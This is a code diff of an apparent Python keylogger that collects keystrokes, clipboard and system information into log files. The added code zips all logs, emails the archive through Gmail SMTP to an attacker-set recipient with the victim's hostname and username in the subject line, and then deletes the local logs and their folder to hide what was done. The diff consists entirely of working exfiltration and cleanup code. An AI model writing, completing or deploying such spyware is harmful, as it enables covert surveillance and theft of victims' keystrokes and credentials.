@@ -3,6 +3,7 @@
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
+from email.mime.application import MIMEApplication
 from email import encoders
 import smtplib
 
@@ -64,19 +65,6 @@ keys_information = "key_log.txt"
 # system_information_enc = 'enc_system.txt'
 # clipboard_information_enc = 'enc_clipboard.txt'
 # keys_information_enc = 'enc_keys_logged.txt'
-
-# Email - https://medium.com/@abdullahzulfiqar653/sending-emails-with-attachments-using-python-32b908909d73
-
-# sender_email = os.environ['SENDER_EMAIL']
-# sender_emails_pwd = os.environ['SENDER_EMAIL_PWD']
-# receiver_email = os.environ['RECEIVER_EMAIL']
-
-# smtp_session = smtplib.SMTP('smtp.gmail.com', 587)
-# smtp_session.starttls()
-# smtp_session.login(sender_email, sender_emails_pwd)
-# message = "Testing3 to see if I can send emails through Python"
-# smtp_session.sendmail(sender_email, receiver_email, message)
-# smtp_session.quit()
 
 # Timer
 
@@ -163,21 +151,44 @@ while current_iteration < no_of_iterations:
 # Creating zipfile of all log files
 
 all_files = os.listdir(logpath)
-zipfile_name = logpath + 'Zipped_logs_' + str(datetime.now()) + '.zip'
+zipfile_name = 'Zipped_logs_' + str(datetime.now()) + '.zip'
+zipfile_full_path = logpath + zipfile_name
 
-with ZipFile(zipfile_name, 'w') as zipobj:
+with ZipFile(zipfile_full_path, 'w') as zipobj:
     for file in all_files:
         full_path = logpath + file
         zipobj.write(full_path)
 
+# Sending the zipfile over Email
+
+subject = "LogFiles - " + str(sys_details.get('hostname')) + " " + str(sys_details.get('current_user')) + " - " + str(datetime.now())
+body = "Loren Ipsum"
+sender_email = os.environ['SENDER_EMAIL']
+recipient_email = os.environ['RECEIVER_EMAIL']
+sender_password = os.environ['SENDER_EMAIL_PWD']
+smtp_server = 'smtp.gmail.com'
+smtp_port = 465
+path_to_file = zipfile_full_path
+
+message = MIMEMultipart()
+message['Subject'] = subject
+message['From'] = sender_email
+message['To'] = recipient_email
+message.attach(MIMEText(body))
+
+with open(zipfile_full_path,'rb') as file:
+    message.attach(MIMEApplication(file.read(), Name=zipfile_name))
+
+with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
+   server.login(sender_email, sender_password)
+   server.sendmail(sender_email, recipient_email, message.as_string())
+
+#Code to delete all the files after the Zipfile is sent over mail
+
+all_files = os.listdir(logpath)
+for file in all_files:
+        full_path = logpath + file
+        os.remove(full_path)
+os.rmdir(logpath)
 
 sys.exit()
-
-    # if time.time() > stopping_time:
-    #     pass
-    #     # Screenshot
-    #     # Clipboard contents
-    #     # Computer Info
-    #     # Email above info
-    #     # incremenet iteration by 1
-    #     # new timing logic
